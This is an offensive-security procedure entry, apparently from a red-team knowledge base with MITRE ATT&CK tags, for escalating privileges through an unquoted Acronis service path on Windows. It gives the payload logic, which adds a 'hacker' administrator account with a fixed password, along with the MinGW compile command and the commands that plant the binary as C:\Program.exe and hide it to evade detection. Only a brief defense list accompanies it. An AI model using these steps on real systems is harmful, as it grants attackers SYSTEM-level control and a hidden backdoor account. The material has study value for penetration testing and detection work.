---
tags:
  - execution
  - hijacking
  - malware-placement
type: procedure
tools:
  - '[[tools/i686-w64-mingw32-gcc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/compile-adduser-exe]]'
platforms:
  - Windows
  - Linux
techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Remote File Copy]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: b35b0748-29a7-4577-8796-c6bcbefe0f04
created_at: '2025-12-14T17:26:17.565Z'
updated_at: '2025-12-14T17:26:17.565Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Remote File Copy]]'
---
# Compile and Place Malicious Executable for Path Hijacking

## Summary

This procedure compiles a proof-of-concept malicious executable that creates a new admin user and places it in a directory hijackable by the unquoted Acronis service path, setting up for SYSTEM-level execution.

## Description

A custom C program (adduser.c) is compiled into a 32-bit Windows executable using MinGW cross-compiler. The binary is then copied to an interceptable location like C:\Program.exe, exploiting the unquoted path parsing. This requires write access to root or Program Files directories, which may involve misconfigurations or external media. Upon service start, Windows executes the hijacked file as SYSTEM.

## Requirements

1. Source code file adduser.c containing net user and net localgroup calls
2. MinGW-w64 cross-compiler installed (for non-Windows build environments)
3. Write access to C:\ or C:\Program Files (x86) (e.g., via live CD or UAC bypass)
4. Target Windows system with vulnerable service

## Defense

Defensive measures and detection strategies:

- Restrict write access to system directories (e.g., via AppLocker or filesystem ACLs)
- Monitor file creation in sensitive paths using Sysmon or Windows Audit Policy
- Scan for unexpected executables in root directories with AV/EDR tools

## Objectives

1. Generate a functional malicious payload
2. Position the payload for automatic execution via path hijacking
3. Ensure compatibility with 32-bit Windows service context

## Instructions

### Step 1: Compile the Payload

**Context**: Build the C source into an executable that will run net commands to add a user when executed as SYSTEM.

**Command** ([[commands/compile-adduser-exe]]):
```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

> This cross-compiles adduser.c (with main() calling system("net user hacker P@ssword! /add") and system("net localgroup administrators hacker /add")) into adduser.exe. Expected output: No errors; adduser.exe created in current directory.

### Step 2: Place Executable in Hijack Path

**Context**: Copy the binary to a location that Windows will resolve before the legitimate path, such as C:\Program.exe.

**Command** (Manual placement):
```cmd
copy adduser.exe C:\Program.exe
attrib +h C:\Program.exe
```

> Copies and hides the file. Expected output: 1 file(s) copied; file hidden to evade casual detection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/compile-adduser-exe]]

## Tools Used

- [[tools/i686-w64-mingw32-gcc]]

## Tags

- compilation
- path-hijacking
- payload-delivery
